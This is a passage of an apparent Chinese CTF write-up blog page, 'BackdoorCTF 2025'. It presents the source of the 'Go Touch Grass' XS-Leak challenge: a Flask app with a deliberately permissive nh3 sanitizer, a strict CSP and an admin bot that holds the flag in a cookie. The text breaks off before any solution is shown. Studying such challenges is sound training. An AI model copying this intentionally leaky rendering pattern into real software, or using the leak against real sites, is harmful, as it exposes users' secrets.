<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Go Touch Grass 一道 XS-Leak 的题目，就是利用懒加载来处理\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 from flask import Flask, request, make_response, render_template_string import os, base64, sys, threading, time, jsonify, nh3 from selenium import webdriver from selenium.webdriver.chrome.options import Options from flask_limiter import Limiter from flask_limiter.util import get_remote_address app = Flask(__name__) PORT = 6005 flag = open('flag.txt').read().strip() # flag charset is string.ascii_lowercase + string.digits ALLOWED_TAGS = { 'a', 'b', 'blockquote', 'br', 'code', 'div', 'em', 'h1', 'h2', 'h3', 'i', 'iframe', 'img', 'li', 'link', 'ol', 'p', 'pre', 'span', 'strong', 'ul' } ALLOWED_ATTRIBUTES = { 'a': {'href', 'target'}, 'link': {'rel', 'href', 'type', 'as'}, '*': { 'style','src', 'width', 'height', 'alt', 'title', 'lang', 'dir', 'loading', 'role', 'aria-label' } } APP_LIMIT_TIME = 60 APP_LIMIT_COUNT = 5 limiter = Limiter( get_remote_address, app=app, storage_uri=&#34;memory://&#34; ) @app.errorhandler(429) def ratelimit_handler(e): return jsonify({ &#34;error&#34;: f&#34;Too many requests, please try again later. Limit is {APP_LIMIT_COUNT} requests per {APP_LIMIT_TIME} seconds.&#34; }), 429 template = &#34;&#34;&#34;<!DOCTYPE html> <html> <head> </head> <body> <div class=&#34;head&#34;></div> {% if flag %} <div class=&#34;flag&#34;><h1>{{ flag }}</h1></div> {% endif %} {% if note %} <div class=&#34;note&#34;>{{ note | safe}}</div> {% endif %} <script nonce=&#34;{{ nonce }}&#34;> Array.from(document.getElementsByClassName('flag')).forEach(function(element) { let text = element.innerText; element.innerHTML = ''; for (let i = 0; i < text.length; i++) { let charElem = document.createElement('span'); charElem.innerText = text[i]; element.appendChild(charElem); } }); </script> </body> </html> &#34;&#34;&#34; @app.route('/', methods=['GET']) def index(): _flag = request.cookies.get('flag', None) nonce = base64.b64encode(os.urandom(32)).decode('utf-8') _note = request.args.get('note', 'Try putting your note with /?note=..') clean_note = nh3.clean( _note, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRIBUTES, ) rendered = render_template_string( template, nonce=nonce, flag=_flag, note=clean_note, ) response = make_response(rendered) response.headers['Content-Security-Policy'] = ( f&#34;default-src 'none'; script-src 'nonce-{nonce}'; style-src 'none'; &#34; &#34;base-uri 'none'; frame-ancestors 'self'; frame-src 'self'; object-src 'none'; &#34; ) response.headers['Referrer-Policy'] = 'no-referrer' response.headers['X-Frame-Options'] = 'SAMEORIGIN' response.headers['X-Content-Type-Options'] = 'nosniff' return response def admin_visit(raw_data_b64: str): try: try: data = base64.b64decode(raw_data_b64.encode('utf-8')).decode('utf-8') except Exception as e: print(f&#34;[BOT] base64 decode error: {e}&#34;, file=sys.stderr) return url = f&#34;http://127.0.0.1:6005/?note={data}&#34; print(f&#34;[BOT] Visiting {url}&#34;, file=sys.stderr) options = Options() options.add_argument(&#34;--headless&#34;) options.add_argument(&#34;--no-sandbox&#34;) options.add_argument(&#34;--disable-dev-shm-usage&#34;) options.add_argument(&#34;--disable-gpu&#34;) driver = webdriver.Chrome(options=options) try: driver.get(&#34;http://127.0.0.1:6005/&#34;) driver.add_cookie({ 'name': 'flag', 'value': flag.replace(&#34;{&#34;, &#34;&#34;).replace(&#34;}&#34;, &#34;&#34;), 'path': '/', 'httpOnly': True, 'sameSite': 'Strict' }) print(f&#34;[BOT] Now visiting target URL {url}&#34;, file=sys.stderr) driver.set_page_load_timeout(5) try: driver.get(url) except Exception as e: print(f&#34;[BOT] error during driver.get: {e}&#34;, file=sys.stderr) time.sleep(5) finally: driver.quit() print(f&#34;[BOT] Done visiting URL {url}&#34;, file=sys.stderr) except Exception as e: print(f&#34;[BOT] Unexpected bot error: {e}&#34;, file=sys.stderr) @app.route('/bot', methods=['GET']) @limiter.limit(f&#34;{APP_LIMIT_COUNT} per {APP_LIMIT_TIME} second&#34;) def bot(): raw_data = request.args.get('note') if not raw_data: return make_response(&#34;Missing ?note parameter\\n&#34;, 400) t = threading.Thread(target=admin_visit, args=(raw_data,)) t.daemon = True t.start() return make_response(&#34;Admin will visit this URL soon.\\n&#34;, 202) if __name__ == '__main__': app.run(port=PORT, debug=False, host='0.0.0.0') 为了方便启动容器，将 dockerfile 加上代理\n"><title>BackdoorCTF 2025</title><link rel=canonical href=https://baozongwi.xyz/p/backdoorctf-2025/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="BackdoorCTF 2025"><meta property='og:description' content="Go Touch Grass 一道 XS-Leak 的题目，就是利用懒加载来处理\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 from flask import Flask, request, make_response, render_template_string import os, base64, sys, threading, time, jsonify, nh3 from selenium import webdriver from selenium.webdriver.chrome.options import Options from flask_limiter import Limiter from flask_limiter.util import get_remote_address app = Flask(__name__) PORT = 6005 flag = open('flag.txt').read().strip() # flag charset is string.ascii_lowercase + string.digits ALLOWED_TAGS = { 'a', 'b', 'blockquote', 'br', 'code', 'div', 'em', 'h1', 'h2', 'h3', 'i', 'iframe', 'img', 'li', 'link', 'ol', 'p', 'pre', 'span', 'strong', 'ul' } ALLOWED_ATTRIBUTES = { 'a': {'href', 'target'}, 'link': {'rel', 'href', 'type', 'as'}, '*': { 'style','src', 'width', 'height', 'alt', 'title', 'lang', 'dir', 'loading', 'role', 'aria-label' } } APP_LIMIT_TIME = 60 APP_LIMIT_COUNT = 5 limiter = Limiter( get_remote_address, app=app, storage_uri=&#34;memory://&#34; ) @app.errorhandler(429) def ratelimit_handler(e): return jsonify({ &#34;error&#34;: f&#34;Too many requests, please try again later. Limit is {APP_LIMIT_COUNT} requests per {APP_LIMIT_TIME} seconds.&#34; }), 429 template = &#34;&#34;&#34;<!DOCTYPE html> <html> <head> </head> <body> <div class=&#34;head&#34;></div> {% if flag %} <div class=&#34;flag&#34;><h1>{{ flag }}</h1></div> {% endif %} {% if note %} <div class=&#34;note&#34;>{{ note | safe}}</div> {% endif %} <script nonce=&#34;{{ nonce }}&#34;> Array.from(document.getElementsByClassName('flag')).forEach(function(element) { let text = element.innerText; element.innerHTML = ''; for (let i = 0; i < text.length; i++) { let charElem = document.createElement('span'); charElem.innerText = text[i]; element.appendChild(charElem); } }); </script> </body> </html> &#34;&#34;&#34; @app.route('/', methods=['GET']) def index(): _flag = request.cookies.get('flag', None) nonce = base64.b64encode(os.urandom(32)).decode('utf-8') _note = request.args.get('note', 'Try putting your note with /?note=..') clean_note = nh3.clean( _note, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRIBUTES, ) rendered = render_template_string( template, nonce=nonce, flag=_flag, note=clean_note, ) response = make_response(rendered) response.headers['Content-Security-Policy'] = ( f&#34;default-src 'none'; script-src 'nonce-{nonce}'; style-src 'none'; &#34; &#34;base-uri 'none'; frame-ancestors 'self'; frame-src 'self'; object-src 'none'; &#34; ) response.headers['Referrer-Policy'] = 'no-referrer' response.headers['X-Frame-Options'] = 'SAMEORIGIN' response.headers['X-Content-Type-Options'] = 'nosniff' return response def admin_visit(raw_data_b64: str): try: try: data = base64.b64decode(raw_data_b64.encode('utf-8')).decode('utf-8') except Exception as e: print(f&#34;[BOT] base64 decode error: {e}&#34;, file=sys.stderr) return url = f&#34;http://127.0.0.1:6005/?note={data}&#34; print(f&#34;[BOT] Visiting {url}&#34;, file=sys.stderr) options = Options() options.add_argument(&#34;--headless&#34;) options.add_argument(&#34;--no-sandbox&#34;) options.add_argument(&#34;--disable-dev-shm-usage&#34;) options.add_argument(&#34;--disable-gpu&#34;) driver = webdriver.Chrome(options=options) try: driver.get(&#34;http://127.0.0.1:6005/&#34;) driver.add_cookie({ 'name': 'flag', 'value': flag.replace(&#34;{&#34;, &#34;&#34;).replace(&#34;}&#34;, &#34;&#34;), 'path': '/', 'httpOnly': True, 'sameSite': 'Strict' }) print(f&#34;[BOT] Now visiting target URL {url}&#34;, file=sys.stderr) driver.set_page_load_timeout(5) try: driver.get(url) except Exception as e: print(f&#34;[BOT] error during driver.get: {e}&#34;, file=sys.stderr) time.sleep(5) finally: driver.quit() print(f&#34;[BOT] Done visiting URL {url}&#34;, file=sys.stderr) except Exception as e: print(f&#34;[BOT] Unexpected bot error: {e}&#34;, file=sys.stderr) @app.route('/bot', methods=['GET']) @limiter.limit(f&#34;{APP_LIMIT_COUNT} per {APP_LIMIT_TIME} second&#34;) def bot(): raw_data = request.args.get('note') if not raw_data: return make_response(&#34;Missing ?note parameter\\n&#34;, 400) t = threading.Thread(target=admin_visit, args=(raw_data,)) t.daemon = True t.start() return make_response(&#34;Admin will visit this URL soon.\\n&#34;, 202) if __name__ == '__main__': app.run(port=PORT, debug=False, host='0.0.0.0') 为了方便启动容器，将 dockerfile 加上代理\n"><meta property='og:url' content='https://baozongwi.xyz/p/backdoorctf-2025/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content><meta property='article:published_time' content='2025-12-10T22:49:38+08:00'><meta property='article:modified_time' content='2025-12-10T22:49:38+08:00'><meta name=twitter:title content="BackdoorCTF 2025"><meta name=twitter:description content="Go Touch Grass 一道 XS-Leak 的题目，就是利用懒加载来处理\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 from flask import Flask, request, make_response, render_template_string import os, base64, sys, threading, time, jsonify, nh3 from selenium import webdriver from selenium.webdriver.chrome.options import Options from flask_limiter import Limiter from flask_limiter.util import get_remote_address app = Flask(__name__) PORT = 6005 flag = open('flag.txt').read().strip() # flag charset is string.ascii_lowercase + string.digits ALLOWED_TAGS = { 'a', 'b', 'blockquote', 'br', 'code', 'div', 'em', 'h1', 'h2', 'h3', 'i', 'iframe', 'img', 'li', 'link', 'ol', 'p', 'pre', 'span', 'strong', 'ul' } ALLOWED_ATTRIBUTES = { 'a': {'href', 'target'}, 'link': {'rel', 'href', 'type', 'as'}, '*': { 'style','src', 'width', 'height', 'alt', 'title', 'lang', 'dir', 'loading', 'role', 'aria-label' } } APP_LIMIT_TIME = 60 APP_LIMIT_COUNT = 5 limiter = Limiter( get_remote_address, app=app, storage_uri=&#34;memory://&#34; ) @app.errorhandler(429) def ratelimit_handler(e): return jsonify({ &#34;error&#34;: f&#34;Too many requests, please try again later. Limit is {APP_LIMIT_COUNT} requests per {APP_LIMIT_TIME} seconds.&#34; }), 429 template = &#34;&#34;&#34;<!DOCTYPE html> <html> <head> </head> <body> <div class=&#34;head&#34;></div> {% if flag %} <div class=&#34;flag&#34;><h1>{{ flag }}</h1></div> {% endif %} {% if note %} <div class=&#34;note&#34;>{{ note | safe}}</div> {% endif %} <script nonce=&#34;{{ nonce }}&#34;> Array.from(document.getElementsByClassName('flag')).forEach(function(element) { let text = element.innerText; element.innerHTML = ''; for (let i = 0; i < text.length; i++) { let charElem = document.createElement('span'); charElem.innerText = text[i]; element.appendChild(charElem); } }); </script> </body> </html> &#34;&#34;&#34; @app.route('/', methods=['GET']) def index(): _flag = request.cookies.get('flag', None) nonce = base64.b64encode(os.urandom(32)).decode('utf-8') _note = request.args.get('note', 'Try putting your note with /?note=..') clean_note = nh3.clean( _note, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRIBUTES, ) rendered = render_template_string( template, nonce=nonce, flag=_flag, note=clean_note, ) response = make_response(rendered) response.headers['Content-Security-Policy'] = ( f&#34;default-src 'none'; script-src 'nonce-{nonce}'; style-src 'none'; &#34; &#34;base-uri 'none'; frame-ancestors 'self'; frame-src 'self'; object-src 'none'; &#34; ) response.headers['Referrer-Policy'] = 'no-referrer' response.headers['X-Frame-Options'] = 'SAMEORIGIN' response.headers['X-Content-Type-Options'] = 'nosniff' return response def admin_visit(raw_data_b64: str): try: try: data = base64.b64decode(raw_data_b64.encode('utf-8')).decode('utf-8') except Exception as e: print(f&#34;[BOT] base64 decode error: {e}&#34;, file=sys.stderr) return url = f&#34;http://127.0.0.1:6005/?note={data}&#34; print(f&#34;[BOT] Visiting {url}&#34;, file=sys.stderr) options = Options() options.add_argument(&#34;--headless&#34;) options.add_argument(&#34;--no-sandbox&#34;) options.add_argument(&#34;--disable-dev-shm-usage&#34;) options.add_argument(&#34;--disable-gpu&#34;) driver = webdriver.Chrome(options=options) try: driver.get(&#34;http://127.0.0.1:6005/&#34;) driver.add_cookie({ 'name': 'flag', 'value': flag.replace(&#34;{&#34;, &#34;&#34;).replace(&#34;}&#34;, &#34;&#34;), 'path': '/', 'httpOnly': True, 'sameSite': 'Strict' }) print(f&#34;[BOT] Now visiting target URL {url}&#34;, file=sys.stderr) driver.set_page_load_timeout(5) try: driver.get(url) except Exception as e: print(f&#34;[BOT] error during driver.get: {e}&#34;, file=sys.stderr) time.sleep(5) finally: driver.quit() print(f&#34;[BOT] Done visiting URL {url}&#34;, file=sys.stderr) except Exception as e: print(f&#34;[BOT] Unexpected bot error: {e}&#34;, file=sys.stderr) @app.route('/bot', methods=['GET']) @limiter.limit(f&#34;{APP_LIMIT_COUNT} per {APP_LIMIT_TIME} second&#34;) def bot(): raw_data = request.args.get('note') if not raw_data: return make_response(&#34;Missing ?note parameter\\n&#34;, 400) t = threading.Thread(target=admin_visit, args=(raw_data,)) t.daemon = True t.start() return make_response(&#34;Admin will visit this URL soon.\\n&#34;, 202) if __name__ == '__main__': app.run(port=PORT, debug=False, host='0.0.0.0') 为了方便启动容器，将 dockerfile 加上代理\n"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#go-touch-grass>Go Touch Grass</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E8%B5%9B%E9%A2%98/>赛题</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/backdoorctf-2025/>BackdoorCTF 2025</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2025-12-10T22:49:38+08:00>Dec 10, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>9 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
</span><span>友情提示：本文最后更新于 67 天前，文中的内容可能已有所发展或发生改变。</span></div><h2 id=go-touch-grass>Go Touch Grass</h2><p>一道 XS-Leak 的题目，就是利用懒加载来处理</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
